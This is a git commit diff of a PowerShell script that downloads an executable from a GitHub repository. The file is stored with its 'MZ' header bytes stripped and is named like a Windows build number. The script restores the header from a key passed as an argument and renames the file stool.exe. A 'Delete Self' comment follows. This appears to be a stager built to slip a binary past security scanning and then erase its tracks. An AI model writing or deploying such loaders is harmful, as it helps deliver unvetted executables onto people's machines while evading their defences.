5b7cbaf114f8f1d79649aec8f98f1a4206f501b6
dexterdreeeam <dexterdreeeam@foxmail.com>
2024-03-15 11:33:27 +0800

    add encryption

--- ST/stool.ps1
+++ ST/stool.ps1
@@ -1,34 +1,35 @@
 $repo = "https://raw.githubusercontent.com/dexterdreeeam/HelpScript/main/"
-$binName = "MZ_10_0_23664_1000.exe"
+$binName = "10_0_23664_1000.exe"
 $binUrl = "$repo/ST/$binName"
 $binPath = Join-Path -Path $pwd -ChildPath $binName
 $stoolPath = Join-Path -Path $pwd -ChildPath "stool.exe"
+$code = $args[0]
+$replace = [System.Text.Encoding]::ASCII.GetBytes($code)
 
 function ValidStoolExist {
-  $stoolExist = Test-Path $stoolPath -PathType Leaf
-  if ($stoolExist) {
-    $firstByte = Get-Content -Path $stoolPath -Encoding Byte -TotalCount 1
-    if ($firstByte -ne 0) {
-      return $true
+    $stoolExist = Test-Path $stoolPath -PathType Leaf
+    if ($stoolExist) {
+        $firstByte = Get-Content -Path $stoolPath -Encoding Byte -TotalCount 1
+        if ($firstByte -ne 0) {
+            return $true
+        }
     }
-  }
-  return $false
+    return $false
 }
 
 while (-not (ValidStoolExist)) {
-  Remove-Item -Path $stoolPath -ErrorAction SilentlyContinue
-  Invoke-WebRequest -Uri $binUrl -OutFile $binPath
-  $replace = [byte[]]@(0x4D, 0x5A)
-  $stream = [System.IO.File]::Open(
-    $binPath,
-    [System.IO.FileMode]::Open,
-    [System.IO.FileAccess]::ReadWrite)
-  $stream.Position = 0
-  $stream.Write($replace, 0, $replace.Length)
-  $stream.Flush()
-  $stream.Close()
-  Start-Sleep -Seconds 3
-  Rename-Item -Path $binPath -NewName $stoolPath
+    Remove-Item -Path $stoolPath -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri $binUrl -OutFile $binPath
+    $stream = [System.IO.File]::Open(
+        $binPath,
+        [System.IO.FileMode]::Open,
+        [System.IO.FileAccess]::ReadWrite)
+    $stream.Position = 0
+    $stream.Write($replace, 0, $replace.Length)
+    $stream.Flush()
+    $stream.Close()
+    Start-Sleep -Seconds 3
+    Rename-Item -Path $binPath -NewName $stoolPath
 }
 
 # Delete Self
